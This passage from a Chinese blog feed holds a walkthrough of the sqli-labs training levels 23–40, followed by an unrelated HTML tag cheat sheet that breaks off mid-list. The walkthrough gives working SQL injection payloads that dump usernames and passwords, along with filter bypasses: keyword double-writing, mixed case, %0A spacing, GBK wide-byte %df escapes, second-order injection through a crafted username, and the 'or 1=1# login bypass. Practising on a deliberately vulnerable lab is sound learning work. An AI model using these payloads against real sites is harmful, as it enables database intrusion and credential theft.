</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"> <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码看似简单粗暴，但是它过滤了注释符，对我们接下来的操作造成短暂的不便，那怎么样才能绕过呢？这是一个关键的问题，我们用注释是为了达到闭合的效果，所以这里只需要改变一下查询语句的闭合位置。<br>测试：<br>输入?id&#x3D;1’ 报错<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-adb31fe7a74e9f90.png" alt="image.png"><br>根据报错提示，发现注入参数是在一对单引号中。<br>注入语句：<br><code>id=0&#39;  union select 1,1,database() #</code><br>不显示。<br>找闭合点：<br>?id&#x3D;1’ union select  ‘1<br>?id&#x3D;1’ union select  1 , ‘1<br>?id&#x3D;1’ union select  1 , 1 ,’1<br>发现前来个都会报错，而最后一个不报错，说明当前查询表的列数是三列。<br>爆库<br><code>?id=0&#39; union select 1,database(),&#39;1</code><br>爆表<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;1</code><br>爆列<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;1</code><br>爆值<br><code>?id=0&#39;%20 union%20 select%20 1, (select group_concat(username,password) from users),&#39;1</code></p><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>利用带有管理员账号的注册用户名，在修改密码的时候达到修改管理员账号密码的效果即可<br>注册用户名：admin’ or ‘1’&#x3D;’1  密码为 admin<br>注册成功后，登录进去修改密码，将密码改为 123<br>更改后即可发现，admin用户的密码也被改成了123，<br><code>update tables set password=’123’ where username=’admin’ or ‘1’=’1’</code></p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>过滤了or和and<br>故这里的and 用&amp;&amp;，anandd代替<br>or用||，oorr代替<br>注入id&#x3D;1’,报错，根据报错提示发现注入参数被一对单引号包裹<br>测试：<br>?id&#x3D;0’ union select 1,1,’1<br>测试成功。<br>爆库：<br><code>?id=0&#39; union select 1,database(),&#39;3</code><br>爆表：<br><code>?id=0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),&#39;3</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-b0d8a5f4b5f7ab32.png" alt="图片.png"><br>发现爆错原来information中【or】被过滤了，只需把information改成infoorrmation即可<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bee70e0275edf96f.png" alt="图片.png"><br>爆列：<br><code>?id=0&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),&#39;3</code><br>爆值：<br><code>?id=0&#39; union select 1,(select group_concat(username,password) from users,&#39;3</code></p><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-34ab949cb3691b09.png" alt="图片.png"><br>简单试了一下，过滤了所有空白字符，看了一下源码，发现过滤的还不少，想要绕过,难度有点大，听说注释法很管用&#x2F;**&#x2F;或者%0a，但是试了一下都不行。。。</p><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>看图标发现union,select，空格都被过滤了，所以想办法绕过：<br>1.双写，发现不行(unionunion selectselect)<br>2.大小写，测试通过(unIon%0ASelEcT%0A)<br>3.将以上两种结合，测试通过(UNionUNION%0ASeLectselect)<br>注入：<br>爆库：<br><code>?id=0&#39; UNionUNION%0ASeLectselect%0A1,database(),&#39;1</code><br>爆表：<br><code>?id=0&#39; UNionUNION%0ASeLectselect%0A1,(seLect%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;),&#39;1</code><br>爆值：<br><code>?id=0&#39;%0AUNionUNION%0ASeLectselect%0A1,(SeLectselect%0Agroup_concat(username,password)%0Afrom%0Ausers),&#39;1</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-83f98985a93b4709.png" alt="图片.png"></p><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>这关没有错误回显，所以只能试，<br>测试;<br>?id&#x3D;1,注入成功。<br>?id&#x3D;1’,不显示。<br>?id&#x3D;1”,注入成功。<br>说明它不单单只有单引号这么简单，猜测它是?id&#x3D;1’) ,注入成功。<br>注入：<br>与前面思路一致，只需绕过union+select<br>爆库：<br><code>?id=0&#39;)%0Aunionunion%0ASElect%0Aselect%0A1,database(),(&#39;1</code></p><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p>这道题简单测试一下恢复正常，单引号注入，详细过程同上。</p><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>简单的测试发现不报错，也不显示，测试后发现注入1或者1’则成功，说明很可能在一对双引号里<br>注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## less-31</span><br><span class="line"></span><br><span class="line">输入?id=1&quot;</span><br><span class="line">![图片.png](https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-2476c269b2318b76.png)</span><br><span class="line">根据报错提示，我们只需在【&quot;】后添加【)】即可</span><br><span class="line">注入:</span><br><span class="line">稍作改动，同之前。</span><br><span class="line"></span><br><span class="line">## less-32</span><br><span class="line"></span><br><span class="line">发现注入1，1‘，1“，这些都对</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>function check_addslashes($string)<br>{<br>$string &#x3D; preg_replace(‘&#x2F;‘. preg_quote(‘\‘) .’&#x2F;‘, “\\\“, $string); &#x2F;&#x2F;escape any backslash<br>$string &#x3D; preg_replace(‘&#x2F;&#39;&#x2F;i’, ‘\&#39;‘, $string); &#x2F;&#x2F;escape single quote with a backslash<br> $string &#x3D; preg_replace(‘&#x2F;&quot;&#x2F;‘, “\&quot;“, $string); &#x2F;&#x2F;escape double quote with a backslash<br>return $string;<br>}<br>$id&#x3D;check_addslashes($_GET[‘id’]);<br> $sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”; $result&#x3D;mysql_query($sql);<br>$row &#x3D; mysql_fetch_array($result);<br> if($row)<br>{<br>echo ‘Your Login name:’. $row[‘username’];<br>echo ‘Your Password:’ .$row[‘password’];<br>}else{<br> print_r(mysql_error());<br> }</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 这里说一下宽字节绕过，因为下面几道题都是</span><br><span class="line"></span><br><span class="line">### 原理</span><br><span class="line"></span><br><span class="line">&gt;mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤’ 的时候，往往利用的思路是将’ 转换为\’ （转换的函数或者思路会在每一关遇到的时候介绍）。</span><br><span class="line">&gt;%df 吃掉 \ 具体的原因是 urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line">&gt;将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的 %5c 会被前面的 %5c 给注释掉。这也是bypass 的一种方法。</span><br><span class="line"></span><br><span class="line">### 注入思路</span><br><span class="line"></span><br><span class="line">&gt;将’ 前面添加的\ 除掉，一般有两种思路：</span><br><span class="line">&gt;urlencode(\’) = %5c%27，我们在 %5c%27 前面添加 %df，形成 %df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此事 %df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line"></span><br><span class="line">所以根据以上不难判断出,payload:</span><br><span class="line">```?id=0%df&#x27; union select 1,1,database() --+```</span><br><span class="line"></span><br><span class="line">## less-33</span><br><span class="line"></span><br><span class="line">同less-32</span><br><span class="line">payload:```?id=0%df%27%20union%20select%201,1,1%20--+```</span><br><span class="line"></span><br><span class="line">## less-34</span><br><span class="line"></span><br><span class="line">### 原理</span><br><span class="line"></span><br><span class="line">&gt;本关是 post 型的注入漏洞，同样的也是将post 过来的内容进行了 ‘\’ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的 \ 给吃掉。而 get 型的方式我们是以 url 形式提交的，因此数据会通过URLencode，如何将方法用在 post 型的注入当中，我们此处介绍一个新的方法。</span><br><span class="line">&gt;将 utf-8 转换为 utf-16 或 utf-32，例如将 ’ 转为 utf-16 为 %EF%BF%BD% 。我们就可以利用这个方式进行尝试。</span><br><span class="line">&gt;POST型 这里使用万能账号</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">uname:&#x27;or 1=1#</span><br><span class="line">password: 任意</span><br></pre></td></tr></table></figure><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>输入id&#x3D;1’,报错<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-7a56fa0d5c5b09b5.png" alt="图片.png"><br>根据报错发现没用单引号,id 没有被 ’ 符号包括起来，那我们就没有必要去考虑check_addslashes() 函数的意义了<br>爆库:<br><code>?id=0 union select 1,1,database() --+</code><br>爆表：<br><code>?id=0 union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+</code><br>爆值:<br><code>?id=0 union select 1,group_concat(username),group_concat(password) from security.users where 1 #</code></p><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>爆库：<br><code>?id=0%df%27%20union%20select%201,1,database()--+</code><br>爆表：<br><code>?id=0%df%27%20union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()--+</code><br>爆值：<br><code>?id=0%df&#39; union select 1,group_concat(username),group_concat(password) from security.users where 1 #</code></p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>POST型 这里使用万能账号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="string">&#x27;or 1=1#</span></span><br><span class="line"><span class="string">password: 任意</span></span><br></pre></td></tr></table></figure><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>爆库：<br><code>?id=0&#39; union select 1,1,database()--+</code><br>爆表：<br><code>?id=0&#39; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>爆库：<br><code>?id=0 union select 1,1,database()--+</code><br>同38只不过变为?id&#x3D;0去掉单引号</p><h2 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h2><p>注入1，1”都对，但是1‘不对，也不回显，故根据经验我猜测是’)。<br>测试：<br><code>?id=0&#39;) union select 1,1,1--+</code><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-deae43640aa8391b.png" alt="图片.png"><br>爆库：<br><code>?id=0&#39;) union select 1,1,1--+</code><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-a7be2e07f66c94d1.png" alt="图片.png"><br>同上只是id&#x3D;0变为id&#x3D;0’)加上单引号和括号。</p><h2 id="附有用"><a href="#附有用" class="headerlink" title="附有用"></a>附有用</h2><p><a href="https://blog.csdn.net/Kevinhanser/article/details/81563451">sqli-labs宽字节注入题目深入学习</a><br><a href="https://encoder.mattiasgeniar.be/index.php">Decoder - Encoder</a><br><a href="https://www.freebuf.com/articles/web/36683.html">见到WAF不害怕，注入绕过</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Sql Lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML Quick Reference Notes</title>
      <link href="/2019/01/19/HTML-Quick-Reference-Notes/"/>
      <url>/2019/01/19/HTML-Quick-Reference-Notes/</url>
      
        <content type="html"><![CDATA[<p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-19afe47c8345a317.png" alt="image"></p><h1 id="随笔"><a href="#随笔" class="headerlink" title="随笔"></a>随笔</h1><h1 id="HTML-速查列表"><a href="#HTML-速查列表" class="headerlink" title="HTML 速查列表"></a>HTML 速查列表</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;文档标题&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;可见文本...&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="基本标签（Basic-Tags）"><a href="#基本标签（Basic-Tags）" class="headerlink" title="基本标签（Basic Tags）"></a>基本标签（Basic Tags）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;最大的标题&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt; . . . &lt;/h2&gt;</span><br><span class="line">&lt;h3&gt; . . . &lt;/h3&gt;</span><br><span class="line">&lt;h4&gt; . . . &lt;/h4&gt;</span><br><span class="line">&lt;h5&gt; . . . &lt;/h5&gt;</span><br><span class="line">&lt;h6&gt;最小的标题&lt;/h6&gt;</span><br><span class="line">&lt;p&gt;这是一个段落。&lt;/p&gt;</span><br><span class="line">&lt;br&gt; （换行）</span><br><span class="line">&lt;hr&gt; （水平线）</span><br><span class="line">&lt;!-- 这是注释 --&gt;</span><br></pre></td></tr></table></figure><h4 id="文本格式化（Formatting）"><a href="#文本格式化（Formatting）" class="headerlink" title="文本格式化（Formatting）"></a>文本格式化（Formatting）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;粗体文本&lt;/b&gt;</span><br><span class="line">&lt;code&gt;计算机代码&lt;/code&gt;</span><br><span class="line">&lt;em&gt;强调文本&lt;/em&gt;</span><br><span class="line">&lt;i&gt;斜体文本&lt;/i&gt;</span><br><span class="line">&lt;kbd&gt;键盘输入&lt;/kbd&gt;</span><br><span class="line">&lt;pre&gt;预格式化文本&lt;/pre&gt;</span><br><span class="line">&lt;small&gt;更小的文本&lt;/small&gt;</span><br><span class="line">&lt;strong&gt;重要的文本&lt;/strong&gt;</span><br><span class="line">&lt;abbr&gt; （缩写）</span><br><span class="line">&lt;address&gt; （联系信息）</span><br><span class="line">&lt;bdo&gt; （文字方向）</span><br><span class="line">&lt;blockquote&gt; （从另一个源引用的部分）</span><br><span class="line">&lt;cite&gt; （工作的名称）</span><br><span class="line">&lt;del&gt; （删除的文本）</span><br><span class="line">&lt;ins&gt; （插入的文本）</span><br><span class="line">&lt;sub&gt; （下标文本）</span><br><span class="line">&lt;sup&gt; （上标文本）</span><br></pre></td></tr></table></figure><h3 id="链接（Links）"><a href="#链接（Links）" class="headerlink" title="链接（Links）"></a>链接（Links）</h3><hr><h4 id="普通的链接"><a href="#普通的链接" class="headerlink" title="普通的链接"></a>普通的链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.example.com/&quot;&gt;链接文本&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="图像链接"><a href="#图像链接" class="headerlink" title="图像链接"></a>图像链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.example.com/&quot;&gt;&lt;img src=&quot;URL&quot; alt=&quot;替换文本&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="邮件链接"><a href="#邮件链接" class="headerlink" title="邮件链接"></a>邮件链接</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;mailto:webmaster@example.com&quot;&gt;发送e-mail&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;tips&quot;&gt;提示部分&lt;/a&gt;&lt;a href=&quot;#tips&quot;&gt;跳到提示部分&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="图片（Images）"><a href="#图片（Images）" class="headerlink" title="图片（Images）"></a>图片（Images）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;URL&quot; alt=&quot;替换文本&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="样式-区块（Styles-Sections）"><a href="#样式-区块（Styles-Sections）" class="headerlink" title="样式&#x2F;区块（Styles&#x2F;Sections）"></a>样式&#x2F;区块（Styles&#x2F;Sections）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line"></span><br><span class="line">h1</span><br><span class="line">&#123;</span><br><span class="line">color:red;</span><br><span class="line">&#125;</span><br><span class="line">p </span><br><span class="line">&#123;</span><br><span class="line">color:blue;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;&lt;div&gt;文档中的块级元素&lt;/div&gt;</span><br><span class="line">&lt;span&gt;文档中的内联元素&lt;/span&gt;</span><br></pre></td></tr></table></figure><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;   </span><br><span class="line"> &lt;li&gt;项目&lt;/li&gt;   </span><br><span class="line"> &lt;li&gt;项目&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol&gt;   </span><br><span class="line"> &lt;li&gt;第一项&lt;/li&gt;    </span><br><span class="line">&lt;li&gt;第二项&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure><h4 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dl&gt; </span><br><span class="line"> &lt;dt&gt;项目 1&lt;/dt&gt;   </span><br><span class="line"> &lt;dd&gt;描述项目 1&lt;/dd&gt; </span><br><span class="line"> &lt;dt&gt;项目 2&lt;/dt&gt;    </span><br><span class="line">&lt;dd&gt;描述项目 2&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure><h4 id="表格（Tables）"><a href="#表格（Tables）" class="headerlink" title="表格（Tables）"></a>表格（Tables）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;table border=&quot;1&quot;&gt; </span><br><span class="line"> &lt;tr&gt;    </span><br><span class="line">&lt;th&gt;表格标题&lt;/th&gt;   </span><br><span class="line">&lt;th&gt;表格标题&lt;/th&gt;  </span><br><span class="line">&lt;/tr&gt;  </span><br><span class="line">&lt;tr&gt;  </span><br><span class="line">&lt;td&gt;表格数据&lt;/td&gt;    </span><br><span class="line">&lt;td&gt;表格数据&lt;/td&gt; </span><br><span class="line"> &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><h4 id="框架（Iframe）"><a href="#框架（Iframe）" class="headerlink" title="框架（Iframe）"></a>框架（Iframe）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;demo_iframe.htm&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h4 id="表单（Forms）"><a href="#表单（Forms）" class="headerlink" title="表单（Forms）"></a>表单（Forms）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;demo_form.php&quot; method=&quot;post/get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; size=&quot;40&quot; maxlength=&quot;50&quot;&gt;</span><br><span class="line">&lt;input type=&quot;password&quot;&gt;</span><br><span class="line">&lt;input type=&quot;checkbox&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;radio&quot; checked=&quot;checked&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Send&quot;&gt;</span><br><span class="line">&lt;input type=&quot;reset&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;苹果&lt;/option&gt;</span><br><span class="line">&lt;option selected=&quot;selected&quot;&gt;香蕉&lt;/option&gt;</span><br><span class="line">&lt;option&gt;樱桃&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;textarea name=&quot;comment&quot; rows=&quot;60&quot; cols=&quot;20&quot;&gt;</span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line"> &lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="实体（Entities）"><a href="#实体（Entities）" class="headerlink" title="实体（Entities）"></a>实体（Entities）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt; 等同于 &lt;&amp;gt; 等同于 &gt;&amp;#169; 等同于 ©</span><br></pre></td></tr></table></figure><h1 id="HTML标签合集-附学习地址"><a href="#HTML标签合集-附学习地址" class="headerlink" title="HTML标签合集(附学习地址)"></a>HTML标签合集(附学习地址)</h1><pre><code>&lt;!--...--&gt;| 定义注释 |&lt;!DOCTYPE&gt;| 定义文档类型 |&lt;a&gt;(http://www.runoob.com/tags/tag-a.html) | 定义超文本链接 |&lt;abbr&gt;(http://www.runoob.com/tags/tag-abbr.html) | 定义缩写 |&lt;acronym&gt;(http://www.runoob.com/tags/tag-acronym.html)| 定义只取首字母的缩写，不支持HTML5 |&lt;address&gt;(http://www.runoob.com/tags/tag-address.html) | 定义文档作者或拥有者的联系信息 |&lt;applet&gt;(http://www.runoob.com/tags/tag-applet.html) | HTML5中不赞成使用。定义嵌入的 applet。 |&lt;area&gt;(http://www.runoob.com/tags/tag-area.html) | 定义图像映射内部的区域 |&lt;article&gt;(http://www.runoob.com/tags/tag-article.html)| 定义一个文章区域 |&lt;aside&gt;(http://www.runoob.com/tags/tag-aside.html)| 定义页面的侧边栏内容 |&lt;audio&gt;(http://www.runoob.com/tags/tag-audio.html)| 定义音频内容 |&lt;b&gt;(http://www.runoob.com/tags/tag-b.html) | 定义文本粗体 |&lt;base&gt;(http://www.runoob.com/tags/tag-base.html) | 定义页面中所有链接的默认地址或默认目标.|&lt;basefont&gt;(http://www.runoob.com/tags/tag-basefont.html) | HTML5不支持，不赞成使用。定义页面中文本的默认字体、颜色或尺寸. |&lt;bdi&gt;(http://www.runoob.com/tags/tag-bdi.html) | 允许您设置一段文本，使其脱离其父元素的文本方向设置.|&lt;bdo&gt;(http://www.runoob.com/tags/tag-bdo.html) | 定义文字方向 |&lt;big&gt;(http://www.runoob.com/tags/tag-big.html) | 定义大号文本，HTML5不支持 |&lt;blockquote&gt;(http://www.runoob.com/tags/tag-blockquote.html) | 定义长的引用 |&lt;body&gt;(http://www.runoob.com/tags/tag-body.html) | 定义文档的主体 |&lt;br&gt;(http://www.runoob.com/tags/tag-br.html) | 定义换行 |&lt;button&gt;(http://www.runoob.com/tags/tag-button.html) | 定义一个点击按钮 |&lt;canvas&gt;(http://www.runoob.com/tags/tag-canvas.html) | 定义图形，比如图表和其他图像,标签只是图形容器，您必须使用脚本来绘制图形 |&lt;caption&gt;(http://www.runoob.com/tags/tag-caption.html) | 定义表格标题 |&lt;center&gt;(http://www.runoob.com/tags/tag-center.html) | HTML5不支持，不赞成使用。定义居中文本。 |&lt;cite&gt;(http://www.runoob.com/tags/tag-cite.html) | 定义引用(citation) |&lt;code&gt;(http://www.runoob.com/tags/tag-code.html) | 定义计算机代码文本 |&lt;col&gt;(http://www.runoob.com/tags/tag-col.html) | 定义表格中一个或多个列的属性值 |&lt;colgroup&gt;(http://www.runoob.com/tags/tag-colgroup.html) | 定义表格中供格式化的列组 |&lt;command&gt;(http://www.runoob.com/tags/tag-command.html)| 定义命令按钮，比如单选按钮、复选框或按钮 |&lt;datalist&gt;(http://www.runoob.com/tags/tag-datalist.html) | 定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值. |&lt;dd&gt;(http://www.runoob.com/tags/tag-dd.html) | 定义定义列表中项目的描述 |&lt;del&gt;(http://www.runoob.com/tags/tag-del.html) | 定义被删除文本 |&lt;details&gt;(http://www.runoob.com/tags/tag-details.html) | 用于描述文档或文档某个部分的细节 |&lt;dfn&gt;(http://www.runoob.com/tags/tag-dfn.html) | 定义定义项目 |&lt;dialog&gt;(http://www.runoob.com/tags/tag-dialog.html)| 定义对话框，比如提示框 |&lt;dir&gt;(http://www.runoob.com/tags/tag-dir.html) | HTML5不支持，不赞成使用。定义目录列表。 |&lt;div&gt;(http://www.runoob.com/tags/tag-div.html) | 定义文档中的节 |&lt;dl&gt;(http://www.runoob.com/tags/tag-dl.html) | 定义列表详情 |&lt;dt&gt;(http://www.runoob.com/tags/tag-dt.html) | 定义列表中的项目 |&lt;em&gt;(http://www.runoob.com/tags/tag-em.html) | 定义强调文本 |&lt;embed&gt;(http://www.runoob.com/tags/tag-embed.html)| 定义嵌入的内容，比如插件。 |&lt;fieldset&gt;(http://www.runoob.com/tags/tag-fieldset.html) | 定义围绕表单中元素的边框 |&lt;figcaption&gt;(http://www.runoob.com/tags/tag-figcaption.html)| 定义&lt;figure&gt; 元素的标题 